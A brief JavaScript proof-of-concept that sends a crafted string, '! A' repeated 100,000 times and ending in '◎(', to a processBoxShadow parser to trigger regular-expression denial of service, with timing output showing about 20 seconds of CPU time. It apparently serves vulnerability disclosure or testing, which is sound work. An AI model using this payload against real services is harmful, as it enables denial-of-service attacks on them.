import processBoxShadow from "./processBoxShadow.js";

//Attack String :""+"! A"*100000+"◎("
var str = "";
for (var i = 0; i < 100000; i++) {
  str += "! A";
}
str += "◎(";

console.log(processBoxShadow(str));

//在运行至正则表达式所在行之后报错

// real    0m20.067s
// user    0m20.023s
// sys     0m0.020s